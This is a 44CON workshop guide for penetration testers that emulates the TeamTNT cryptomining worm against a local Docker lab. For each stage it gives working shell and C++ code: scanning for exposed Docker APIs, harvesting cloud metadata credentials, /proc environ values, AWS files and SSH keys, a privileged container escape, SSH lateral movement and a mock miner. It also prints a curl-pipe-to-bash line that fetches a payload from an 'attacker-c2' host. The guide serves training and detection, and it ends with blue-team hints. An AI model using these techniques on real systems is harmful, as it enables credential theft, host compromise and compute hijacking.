**44CON 2026** · 50 minutes · Penetration testers  
**Threat actor:** [MITRE ATT&CK G0139 — TeamTNT](https://attack.mitre.org/groups/G0139/)  
**Platform:** Linux, Docker, cloud/container targets

---

## 1. TeamTNT Kill Chain
TeamTNT is a cloud-focused cryptomining worm. This workshop covers the **automated offensive half** of the kill chain: discovery through impact, before defenders typically detect evasion.

```
┌─────────────┐    ┌──────────────┐    ┌─────────────────┐    ┌──────────────┐
│ 1. Scan     │───►│ 2. Initial   │───►│ 3. Credential   │───►│ 4. Container │
│  (T1595,    │    │    access    │    │    harvest      │    │  discovery   │
│   T1046)    │    │ (T1133)      │    │ (T1552,T1083)   │    │ (T1613,T1610)│
└─────────────┘    └──────────────┘    └─────────────────┘    └────────┬─────┘
                                                                       │
┌─────────────┐    ┌──────────────┐    ┌─────────────────┐             │
│ 7. Impact   │◄───│ 6. Lateral   │◄───│ 5. Escape +     │◄────────────┘
│ (T1496)     │    │  movement    │    │  tool transfer  │
│ mock XMRig  │    │ (T1021,T1078)│    │ (T1611,T1105)   │
└─────────────┘    └──────────────┘    └─────────────────┘
```

**Out of scope for this workshop** (covered in Workshop 2): rootkits, log wiping, masquerading, persistence.

**Misconfigurations targeted:**

| Stage | Weakness |
|-------|----------|
| Scan | Docker API ports reachable on the network |
| Access | Docker daemon on TCP without TLS or authentication |
| Harvest | IMDSv1, readable `/proc/*/environ`, credentials in container filesystems |
| Escape | Privileged containers, host filesystem mounts |
| Impact | No CPU limits, no cryptomining detection |

---

## 2. Setting Up the Lab

### Prerequisites

- Docker Engine + Docker Compose v2
- 4 GB free RAM
- Linux or macOS host

### Start the lab

From the repository root (`44con/`):

```bash
chmod +x setup-lab.sh workshop-01-automating-attack-ttps/scripts/*.sh
./setup-lab.sh
```

This starts:

| Service | In-lab hostname | Host port | Role |
|---------|-----------------|-----------|------|
| `docker-api` | `docker-api:2375` | `127.0.0.1:2375` | Misconfigured Docker Engine API |
| `victim-app` | `victim-app:80` | `127.0.0.1:8080` | Web app with planted creds |
| `metadata-sim` | `metadata-sim:80` | `127.0.0.1:8180` | IMDSv1 metadata simulator |
| `attacker` | — | — | Attacker workstation (shell + C++ tools) |

### Enter the attacker container

All workshop commands below assume you are **inside** the attacker container unless noted:

```bash
docker compose -f workshop-01-automating-attack-ttps/lab/docker-compose.yml exec attacker bash
```

Pre-set environment variables inside the attacker:

```bash
TEAMTNT_LAB=1
STAGING_DIR=/tmp/teamtnt-staging
DOCKER_API_URL=tcp://docker-api:2375
METADATA_URL=http://metadata-sim/latest/meta-data
```

### Build C++ automation (first time)

```bash
bash /opt/teamtnt/native_automation/build-in-lab.sh
# Binary: /opt/teamtnt/native_automation/build-docker/teamtnt_native
```

### Teardown

```bash
cd workshop-01-automating-attack-ttps/lab && docker compose down -v
```

---

## 3. Simulating the TeamTNT Kill Chain

### Run all steps

**Shell automation:**

```bash
docker exec lab-attacker-1 bash /opt/teamtnt/scripts/teamtnt-chain.sh
```

**C++ automation:**

```bash
# build everything
docker exec lab-attacker-1 bash /opt/teamtnt/native_automation/build-in-lab.sh

# run the built binary
docker exec lab-attacker-1 /opt/teamtnt/native_automation/build-docker/teamtnt_native
# Single step: teamtnt_native 3
```

Artifacts are written to `/tmp/teamtnt-staging/`.

### Attendee C++ exercises

The native automation binary ships **incomplete**: look for `// TODO:` comments in the source. Shell scripts (`/opt/teamtnt/scripts/`) are fully working — use them to verify expected behaviour, then implement the matching C++ logic yourself. The snippets in each step below are your reference; **full solutions are shared only at the end of the workshop**.

Rebuild after each edit:

```bash
docker exec lab-attacker-1 bash /opt/teamtnt/native_automation/build-in-lab.sh
docker exec lab-attacker-1 /opt/teamtnt/native_automation/build-docker/teamtnt_native <step>
```

| Step | `teamtnt_native` | File (in container) | Function | Approx. lines | What to implement |
|------|------------------|---------------------|----------|---------------|-------------------|
| 1 | `1` | `native_automation/src/attack_steps.cpp` | `step01_scan()` | ~45 | Populate `targets` with lab hostnames/ports (`ScanTarget` — see `include/net_scanner.hpp`) |
| 1 | `1` | `native_automation/src/net_scanner.cpp` | `tcp_connect()` | ~29 | Non-blocking TCP connect scan inside the `for (addrinfo* p …)` loop |
| 2 | `2` | `native_automation/src/attack_steps.cpp` | `step02_probe_docker()` | ~64–67 | Call `docker_.list_containers(true)` and format rows into `docker-ps.txt` |
| 3 | `3` | `native_automation/src/attack_steps.cpp` | `step03_harvest_credentials()` | ~87 | Walk `/proc/*/environ` for `AWS_` / `KUBERNETES_` variables (metadata + victim file harvest is pre-filled) |
| 4 | `4` | `native_automation/src/attack_steps.cpp` | `step04_container_discovery()` | ~111 | `pull_image()` + `run_container()` for `busybox:1.36` (T1204.003) |
| 5 | `5` | `native_automation/src/attack_steps.cpp` | `step05_escape_and_deploy()` | ~123, ~135 | Privileged escape container with `/:/host:rw` bind; HTTPS download to `helper.sh` |
| 6 | `6` | `native_automation/src/attack_steps.cpp` | `step06_lateral_movement()` | ~149, ~155 | SSH lateral movement — key-based and password-based cases against `lateral-ssh-target` |
| 7 | `7` | — | — | — | **Complete** — mock miner deploy (`step07_mock_miner()`) |

Repo-relative paths (on your host): `workshop-01-automating-attack-ttps/native_automation/src/…`

---

### Step 1 — Network Discovery & Scanning

#### T1595.001 — Active Scanning: Scanning IP Blocks

TeamTNT scans large cloud IP ranges to find reachable hosts. In the wild they use `masscan` and `zmap` against provider CIDR blocks.

**Shell / Linux utilities:**

```bash
# Lab: fast TCP sweep of known targets (see scripts/01-scan-targets.sh)
for host in docker-api victim-app metadata-sim; do
  ip=$(getent hosts "$host" | awk '{print $1}')
  for port in 2375 80; do
    timeout 2 bash -c "echo >/dev/tcp/${ip}/${port}" 2>/dev/null \
      && echo "OPEN ${host}:${port}"
  done
done

# Debrief — real TeamTNT scale (do NOT run full /24 in 50-min slot):
# masscan 10.0.0.0/8 -p2375,10250 --rate=10000
```

**C++** (`teamtnt_native 1`):

**Your task:** `native_automation/src/attack_steps.cpp` → `step01_scan()` (~line 45) and `native_automation/src/net_scanner.cpp` → `tcp_connect()` (~line 29).

Define the lab targets and ports TeamTNT would hunt for (e.g. Docker API, web, kubelet debrief ports):

```cpp
// attack_steps.cpp
const std::vector<ScanTarget> targets = {
    {"docker-api", {2375, 10250, 10255}},  // 10250/10255 = kubelet (debrief only)
    {"victim-app", {80}},
    {"metadata-sim", {80}},
};
```

Each host/port pair is probed with a non-blocking TCP `connect()` — the similar primitive underlying `masscan`/`nmap` SYN checks (note that it is not exactly the same).

We start by resolving the given hostname:

```cpp
bool tcp_connect(const std::string& host, int port, int timeout_ms) {
  addrinfo hints{};
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  
  addrinfo* res = nullptr;
  const std::string port_str = std::to_string(port);
  // getaddrinfo() resolves docker-api → 172.30.0.x
  if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &res) != 0)
    return false;
  // ... non-blocking connect + select() with timeout ...
}
```

We can now iterate over results of hostname lookup, and connect on given port:
```cpp
bool connected = false;  
for (addrinfo* p = res; p; p = p->ai_next) {  
  // create a socket
  const int fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);  
  if (fd < 0) continue;  
  
  // set it to non blocking
  const int flags = fcntl(fd, F_GETFL, 0);  
  fcntl(fd, F_SETFL, flags | O_NONBLOCK);  
  
  // attempt to connect
  const int rc = connect(fd, p->ai_addr, p->ai_addrlen);  
  if (rc == 0) {  
    // connection confirmed
    connected = true;  
    close(fd);  
    break;  
  }  
  /*handle error case here*/ 
  close(fd);  
}
```

The `connect()` call can fail with `EINPROGRESS`, because we have set the socket to non-blocking mode, and 3-way TCP handshake can take time. We need to handle that case as well:
```cpp
if (errno == EINPROGRESS) {  
    fd_set wfds;  
    FD_ZERO(&wfds);  
    FD_SET(fd, &wfds);  
    timeval tv{};  
    tv.tv_sec = timeout_ms / 1000;  
    tv.tv_usec = (timeout_ms % 1000) * 1000;  
    if (select(fd + 1, nullptr, &wfds, nullptr, &tv) > 0) {  
      int err = 0;  
      socklen_t len = sizeof(err);  
      if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len) == 0 && err == 0) {  
        connected = true;  
        close(fd);  
        break;  
      }  
    }  
  }
```

And finally, we return to indicate whether the connection happened or not:
```cpp
freeaddrinfo(res);  
return connected;
```

Now we can iterate over targets, and collect ports where a connection was successful. Once scanning is complete, open ports are logged and written to the staging file:

```cpp
const auto results = scan_targets(targets);
for (const auto& r : results) {
  out << "open tcp " << r.port << ' ' << r.ip << ' ' << now << '\n';
  log("  OPEN " + r.host + " (" + r.ip + "):" + std::to_string(r.port));
}
write_file(staging("scan-results.txt"), out.str());
```

---

#### T1595.002 — Active Scanning: Vulnerability Scanning

Probing for specific vulnerable services (Docker API) rather than generic port presence. TeamTNT also scans for kubelet (`10250`/`10255`) in the wild; those ports are included in the scan list for debrief but are not part of this Docker-only lab.

**Shell / Linux utilities:**

```bash
nmap -Pn -p 2375,10250,10255,80 --open docker-api victim-app metadata-sim
# Docker API banner check:
curl -s http://docker-api:2375/version | jq .
```

**C++:**

Vulnerability confirmation for Docker API happens in step 2 — a `GET /version` returns the Engine API JSON banner if the service is unauthenticated (see T1133 below). Port 2375 being open (step 1) is the scan signal; HTTP response is the vulnerability proof.

---

#### T1046 — Network Service Discovery

Enumerating services on discovered hosts to plan exploitation.

**Shell / Linux utilities:**

```bash
nmap -sV -p 2375,80 docker-api victim-app metadata-sim
ss -tlnp   # on compromised host
```

**C++:**

`scan_targets()` returns a vector of `(host, ip, port)` tuples — service discovery output you would feed into the next exploitation stage:

```cpp
struct ScanResult { std::string host, ip; int port; };
std::vector<ScanResult> scan_targets(const std::vector<ScanTarget>& targets);
```

---

### Step 2 — Initial Access via Exposed Docker API

#### T1133 — External Remote Services

TeamTNT gains access through internet-exposed management interfaces — notably Docker API (`:2375`). Hildegard also targets anonymous kubelet APIs in Kubernetes environments (debrief only; not labbed here).

**Shell / Linux utilities:**

```bash
export DOCKER_HOST=tcp://docker-api:2375
docker version          # unauthenticated — initial access confirmed
curl -s http://docker-api:2375/_ping
```

**C++** (`teamtnt_native 2`):

**Your task:** `native_automation/src/attack_steps.cpp` → `step02_probe_docker()` (~lines 64–67) — container listing for `docker-ps.txt`. Ping/version calls below are already wired.

Confirm unauthenticated Docker API access with a ping, then fetch version metadata:

```cpp
log("Probing Docker API at " + cfg_.docker_base_url());
if (!docker_.ping()) die("Docker API unreachable — is the lab running?");
// ping() → GET http://docker-api:2375/_ping; status 200 = unauthenticated access (T1133)

const auto ver = docker_.version();  // GET /version → Engine API JSON banner
write_file(staging("docker-info.txt"), ver.dump(2));
log("Docker API is unauthenticated — initial access confirmed.");
```

---

#### T1613 — Container and Resource Discovery

Listing running containers and images after gaining Docker API access.

**Shell / Linux utilities:**

```bash
export DOCKER_HOST=tcp://docker-api:2375
docker ps -a
docker images
docker inspect <container_id>
```

**C++:**

After initial access, enumerate all containers and write a tabular summary:

```cpp
const auto containers = docker_.list_containers(true);  // GET /containers/json?all=1
```

If there are running containers, the response will be a JSON array, where each entry will have container specific information. We can enumerate, and collection container information at this point:
```cpp
std::ostringstream ps;
ps << "ID\tIMAGE\tSTATUS\tNAMES\n";
if (containers.is_array()) {  
  for (const auto& c : containers) {  
    ps << c.value("Id", "").substr(0, 12) << '\t' << c.value("Image", "") << '\t'  
       << c.value("Status", "") << '\t';  
    if (c.contains("Names") && !c["Names"].empty()) ps << c["Names"][0].get<std::string>();  
    ps << '\n';  
  }  
}
write_file(staging("docker-ps.txt"), ps.str());
```

---

### Step 3 — Credential Harvesting

#### T1552.005 — Unsecured Credentials: Cloud Instance Metadata API

Querying the instance metadata service (e.g. `169.254.169.254`) for temporary IAM credentials. TeamTNT abuses IMDSv1 and SSRF paths.

**Shell / Linux utilities:**

```bash
# Lab metadata simulator
curl -s http://metadata-sim/latest/meta-data/iam/security-credentials/
curl -s http://metadata-sim/latest/meta-data/iam/security-credentials/lab-role | jq .
```

**C++** (`teamtnt_native 3`):

**Your task:** `native_automation/src/attack_steps.cpp` → `step03_harvest_credentials()` (~line 87) — `/proc/*/environ` harvest (T1083). Metadata HTTP calls and victim `docker exec` harvest are pre-filled.

We can capture the credential role list by HTTP request to the metadata IAM URL:

```cpp
const auto meta_list = http_.get(cfg_.metadata_url + "/iam/security-credentials/");
if (meta_list.ok()) creds << meta_list.body << '\n';
```

Similarly, we fetch the temporary credentials for each role:

```cpp
const auto meta_role = http_.get(cfg_.metadata_url + "/iam/security-credentials/lab-role");
if (meta_role.ok()) creds << meta_role.body << '\n';
```

All harvested material is staged to `harvested-creds.txt`.

---

#### T1083 — File and Directory Discovery

Searching filesystem and process environment for sensitive data paths.

**Shell / Linux utilities:**

```bash
# Cloud env vars in process environments
for f in /proc/[0-9]*/environ; do
  tr '\0' '\n' < "$f" | grep -E 'AWS_|KUBERNETES_' && echo "--- $f ---"
done
```

**C++:**

Walk `/proc/*/environ` and filter for cloud-related environment variables. We start by opening the directory, and iterating all its contents
```cpp
if (auto* dir = opendir("/proc")) {
  while (auto* ent = readdir(dir)) {
	  // process here
  }
  closedir(dir);
}
```

Since the file path we are interested in, is related to PIDs, we can skip all paths which do not involve PIDs:
```cpp
if (ent->d_name[0] < '0' || ent->d_name[0] > '9') continue;
```

If the above condition gets skipped, we have a PID path at hand. Now we can read the data:
```cpp
const std::filesystem::path env_path = std::filesystem::path("/proc") / ent->d_name / "environ";
std::ifstream in(env_path, std::ios::binary);
if (!in) continue;

std::string data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
```

The data now has all available environment variables, and their values (separated by `=`) for each process. We can perform sub-string search for known environment variables we are interested in:
```cpp
if (data.find("AWS_") == std::string::npos && data.find("KUBERNETES_") == std::string::npos)
      continue;
```

Finally, we can capture the lines with interesting environment variables:
```cpp
creds << "--- " << env_path.string() << " ---\n";
    for (size_t i = 0; i < data.size();) {
      const size_t end = data.find('\0', i);
      const std::string line = data.substr(i, end == std::string::npos ? data.size() - i : end - i);
      if (line.find("AWS_") != std::string::npos || line.find("KUBERNETES_") != std::string::npos)
        creds << line << '\n';
      if (end == std::string::npos) break;
      i = end + 1;
    }
```

---

#### T1552.001 — Unsecured Credentials: Credentials In Files

Reading `.aws/credentials`, `.docker/config.json`, and similar files from victim containers.

**Shell / Linux utilities:**

```bash
export DOCKER_HOST=tcp://docker-api:2375
VICTIM=$(docker ps --filter name=victim-app -q | head -1)
docker exec "$VICTIM" cat /home/devops/.aws/credentials
docker exec "$VICTIM" cat /home/devops/.docker/config.json
```

**C++:**

Locate the victim container by name, then `cat` credential files via Docker exec API:

```cpp
const std::string victim_id = docker_.find_container_by_name("victim-app");
creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.aws/credentials"}) << '\n';
creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.docker/config.json"}) << '\n';
```

`exec_output()` creates an exec instance and starts it with stdout attached:

```cpp
// POST /containers/{id}/exec  {"Cmd":["cat","/path"],"AttachStdout":true}
const auto create = http_.post(base_ + "/containers/" + container_id + "/exec", body);
// POST /exec/{execId}/start  {"Detach":false,"Tty":false}
const auto start = http_.post(base_ + "/exec/" + exec_id + "/start", start_body);
return demux_stream(start.body);  // strip Docker multiplex framing
```

---

#### T1552.004 — Unsecured Credentials: Private Keys

Harvesting SSH private keys for lateral movement.

**Shell / Linux utilities:**

```bash
docker exec "$VICTIM" cat /home/devops/.ssh/id_rsa
```

**C++:**

Same Docker exec primitive harvests the SSH private key:

```cpp
creds << docker_.exec_output(victim_id, {"cat", "/home/devops/.ssh/id_rsa"}) << '\n';
write_file(staging("harvested-creds.txt"), creds.str());
```

Step 6 later parses the key block from this file with `extract_ssh_key()` for lateral movement.

---

### Step 4 — Container Discovery & Malicious Image Pull

#### T1610 — Deploy Container

Ability to create and run new containers after API compromise (precursor to escape and miner deployment).

**Shell / Linux utilities:**

```bash
docker ps -a --no-trunc > /tmp/teamtnt-staging/containers-full.txt
docker images
```

**C++** (`teamtnt_native 4`):

**Your task:** `native_automation/src/attack_steps.cpp` → `step04_container_discovery()` (~line 111) — pull and run `busybox:1.36`. Container/image dump and inspect below are pre-filled.

Dump full container and image inventories, then inspect a sample container:

```cpp
write_file(staging("containers-full.txt"), docker_.list_containers(true).dump(2));
write_file(staging("images.txt"), docker_.list_images().dump(2));

const auto containers = docker_.list_containers(false);
const std::string id = containers[0]["Id"].get<std::string>();
write_file(staging("inspect-sample.json"), docker_.inspect_container(id).dump(2));
```

---

#### T1204.003 — User Execution: Malicious Image

TeamTNT tricks operators into pulling backdoored images from public registries (Docker Hub). The worm also pulls images directly via API and runs them on the host.

**Shell / Linux utilities:**

```bash
docker pull busybox:1.36    # lab uses benign public image as stand-in
docker run --name teamtnt-pulled-lab busybox:1.36 \
  sh -c 'echo "[T1204] malicious image executed (lab)"; sleep 2'
```

**C++:**

Pull the image, then create and start a container from it — the execution step:

```cpp
docker_.pull_image("busybox", "1.36");  
write_file(staging("pull.log"), "pull busybox:1.36 requested via Docker API\n");  
  
nlohmann::json run_spec;  
run_spec["Image"] = "busybox:1.36";  
run_spec["Cmd"] = nlohmann::json::array(  
    {"sh", "-c", "echo '[T1204] malicious image executed (lab)'; sleep 2"});  
const std::string run_id = docker_.run_container("teamtnt-pulled-lab", run_spec);  
write_file(staging("image-run.log"),  
            run_id.empty() ? "container run failed\n" : "started teamtnt-pulled-lab: " + run_id + "\n");
```

---

### Step 5 — Container Escape & Tool Transfer

#### T1611 — Escape to Host

Deploying privileged containers with host filesystem mounts to break out of container isolation.

**Shell / Linux utilities:**

```bash
docker rm -f teamtnt-escape-lab 2>/dev/null
docker run -d --name teamtnt-escape-lab --privileged -v /:/host:rw busybox:1.36 sleep 3600
docker exec teamtnt-escape-lab sh -c 'ls /host/etc/hostname; cat /host/etc/hostname'
docker exec teamtnt-escape-lab ls -la /host/var/run/docker.sock
```

**C++** (`teamtnt_native 5`):

**Your task:** `native_automation/src/attack_steps.cpp` → `step05_escape_and_deploy()` (~lines 123 and 135) — start `teamtnt-escape-lab` and download `helper.sh`. Host-filesystem `exec_output` below assumes you have a container `id`.

Deploy a privileged container with the host filesystem bind-mounted — classic container escape:

```cpp
nlohmann::json spec;  
spec["Image"] = "busybox:1.36";  
spec["Cmd"] = nlohmann::json::array({"sleep", "3600"});  
spec["HostConfig"]["Privileged"] = true;  
spec["HostConfig"]["Binds"] = nlohmann::json::array({"/:/host:rw"});  
  
const std::string id = docker_.run_container("teamtnt-escape-lab", spec);  
if (id.empty()) {  
  warn("Failed to start escape container");  
  return;  
}
```

Prove host access by reading files through the mount:

```cpp
escape_out << docker_.exec_output(id, {"sh", "-c",
    "ls /host/etc/hostname; cat /host/etc/hostname; "
    "ls -la /host/var/run/docker.sock 2>/dev/null || echo no docker.sock"});
write_file(staging("escape-output.txt"), escape_out.str());
```

---

#### T1105 — Ingress Tool Transfer

Downloading additional payloads from remote servers after initial foothold.

**Shell / Linux utilities:**

```bash
curl -fsSL -A "TeamTNT/44con-lab" -o /tmp/teamtnt-staging/helper.sh \
  https://raw.githubusercontent.com/torvalds/linux/master/README
```

**C++:**

Download a remote payload over HTTPS and stage it locally:

```cpp
const auto dl = http_.get("https://raw.githubusercontent.com/torvalds/linux/master/README");  
write_file(staging("helper.sh"), dl.ok() ? dl.body : "# mock payload\n");
```

---

#### T1071.001 — Application Layer Protocol: Web Protocols

Using HTTP/HTTPS for C2 and payload delivery (curl/wget in TeamTNT bash worms).

**Shell / Linux utilities:**

```bash
curl -A "TeamTNT" http://attacker-c2/payload.sh | bash
wget -qO- http://metadata-sim/latest/meta-data/
```

**C++:**

All HTTP traffic (metadata, payload download, Docker API) goes through libcurl with a TeamTNT-style User-Agent — the same web-protocol C2 channel used in bash worms:

```cpp
// http_client.cpp sets User-Agent: TeamTNT/44con-native on every request
const auto resp = http_.get(url);   // or http_.post(url, body, headers)
```

---

### Step 6 — Lateral Movement

#### T1021.004 — Remote Services: SSH

Using stolen SSH credentials to run commands on adjacent hosts. The lab targets `lateral-ssh-target` with harvested `devops` key and password (`/home/devops/.lab_ssh_creds`).

**Shell / Linux utilities:**

```bash
# Case 1 — SSH with stolen private key
awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' \
  /tmp/teamtnt-staging/harvested-creds.txt > /tmp/teamtnt-staging/id_rsa
chmod 600 /tmp/teamtnt-staging/id_rsa
ssh -i /tmp/teamtnt-staging/id_rsa -o StrictHostKeyChecking=no \
  devops@lateral-ssh-target 'hostname; id'

# Case 2 — SSH with username and password
PASS="$(grep '^devops:' /tmp/teamtnt-staging/harvested-creds.txt | cut -d: -f2-)"
SSHPASS="${PASS}" sshpass -e ssh -o StrictHostKeyChecking=no \
  devops@lateral-ssh-target 'hostname; id'
```

**C++** (`teamtnt_native 6`):

**Your task:** `native_automation/src/attack_steps.cpp` → `step06_lateral_movement()` (~lines 149 and 155) — both SSH cases. Key/password parsing via `extract_ssh_key()` / `extract_ssh_password()` is pre-filled.

Execute remote commands over SSH for both credential types:

For key based authenticaion:
```cpp
write_file(key_path, key);  
chmod(key_path.c_str(), 0600);  
log("SSH key extracted to " + key_path.string());  
  
const std::string key_cmd =  
    "ssh -i " + key_path.string() +  
    " -o StrictHostKeyChecking=no -o ConnectTimeout=5 "  
    "devops@" +  
    target + " 'hostname; id' > " + staging("lateral-ssh-key.log").string() + " 2>&1";  
if (run_command(key_cmd) == 0) {  
  log("SSH key lateral command succeeded (T1021.004)");  
} else {  
  warn("SSH key lateral failed — is lateral-ssh-target running?");  
}
```

For username/password based authentication:
```cpp
write_file(staging("lateral-ssh-password.sh"),  
           "#!/bin/bash\nexport SSHPASS='" + password + "'\n"  
           "sshpass -e ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "           "devops@" +  
               target + " 'hostname; id'\n");  
chmod(staging("lateral-ssh-password.sh").c_str(), 0755);  
const std::string pass_cmd = "bash " + staging("lateral-ssh-password.sh").string() + " > " +  
                             staging("lateral-ssh-password.log").string() + " 2>&1";  
if (run_command(pass_cmd) == 0) {  
  log("SSH password lateral command succeeded (T1021.004)");  
} else {  
  warn("SSH password lateral failed — is sshpass installed and lateral-ssh-target running?");  
}
```

---

#### T1078.004 — Valid Accounts: Cloud Accounts

Using stolen AWS credentials for cloud API enumeration.

**Shell / Linux utilities:**

```bash
export AWS_ACCESS_KEY_ID=AKIA...
aws sts get-caller-identity
aws s3 ls
```

**C++:**

If AWS access keys were harvested from metadata or victim files, flag them for cloud API enumeration:

```cpp
if (creds.find("AKIA") != std::string::npos) {
  write_file(staging("aws-identity.txt"),
      "Harvested AWS key present — would run aws sts get-caller-identity\n");
}
```

---

### Step 7 — Impact: Resource Hijacking (Mock Miner)

#### T1496.001 — Resource Hijacking: Compute Hijacking

Deploying XMRig or similar miners to monetise compromised CPU. Lab uses a **mock** busybox CPU loop — no real mining pool traffic.

**Shell / Linux utilities:**

```bash
docker rm -f k8s-guardian-miner 2>/dev/null
docker run -d --name k8s-guardian-miner --cpus=0.25 busybox:1.36 \
  sh -c 'while true; do dd if=/dev/zero of=/dev/null bs=1M count=2 2>/dev/null; sleep 1; done'
docker stats --no-stream k8s-guardian-miner
```

**C++** (`teamtnt_native 7`):

Deploy a masqueraded miner container with a CPU-burn loop (lab-safe mock of XMRig):

```cpp
nlohmann::json spec;
spec["Image"] = "busybox:1.36";
spec["Cmd"] = nlohmann::json::array({"sh", "-c",
    "while true; do dd if=/dev/zero of=/dev/null bs=1M count=2 2>/dev/null; sleep 1; done"});
spec["HostConfig"]["NanoCpus"] = 250000000;  // cap at 0.25 CPU in lab

const std::string id = docker_.run_container("k8s-guardian-miner", spec);
```

TeamTNT names containers to blend in (`k8s-guardian-miner`); Workshop 2 covers further masquerading and hiding.

---

## Blue Team Detection Hints (Workshop 1)

| Signal | Where to look |
|--------|---------------|
| Unauthenticated Docker API | Port 2375 open, `/_ping` from unexpected IPs |
| Metadata credential access | IMDS audit logs, VPC flow logs to `169.254.169.254` |
| Privileged container created | Docker audit / Falco: `run --privileged` |
| Mock miner container | High CPU, container name `k8s-guardian-miner` |
| Staged cred files | `/tmp/teamtnt-staging/harvested-creds.txt` on attacker |

---

## References

- [MITRE G0139 — TeamTNT](https://attack.mitre.org/groups/G0139/)
- [Hildegard S0601](https://attack.mitre.org/software/S0601/) — related cloud/container malware (kubelet focus in wild; debrief reference)

**Legal notice:** Lab only. Isolated Docker network. Fake credentials. Mock miners.
